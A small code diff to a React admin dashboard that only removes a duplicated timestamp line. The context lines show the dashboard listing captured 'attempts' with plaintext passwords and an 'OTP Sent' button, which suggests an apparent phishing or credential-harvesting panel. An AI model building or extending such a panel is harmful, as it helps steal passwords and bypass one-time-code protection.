@@ -145,7 +145,6 @@ const AdminDashboard = () => {
             </Text>
             <Text>Password: {attempt.response.password}</Text>
             <Text>Timestamp: {attempt.timestamp}</Text>
-            <Text>Timestamp: {attempt.timestamp}</Text>
 
             <Button onClick={() => handleOtpSendResponse(attempt)} mt={2}>
               OTP Sent
